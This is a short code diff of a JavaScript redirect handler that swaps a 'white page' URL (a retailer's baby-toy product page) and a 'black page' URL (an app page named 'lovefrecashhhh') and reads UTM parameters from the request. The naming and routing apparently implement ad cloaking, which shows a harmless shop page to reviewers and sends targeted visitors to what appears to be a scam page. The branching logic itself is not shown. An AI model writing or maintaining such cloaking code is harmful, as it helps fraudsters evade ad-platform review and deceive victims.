@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.klein-toys-shop.de/en/Products/Garden-Outdoor/Weber/Weber-Genesis-barbecue-made-of-wood-MDF.html#&gid=1&pid=1";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.vertbaudet.com/en/aro-plush-baby-seal-for-children-20-cm-steiff-white.htm?ProductId=341021121&FiltreCouleur=0402";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
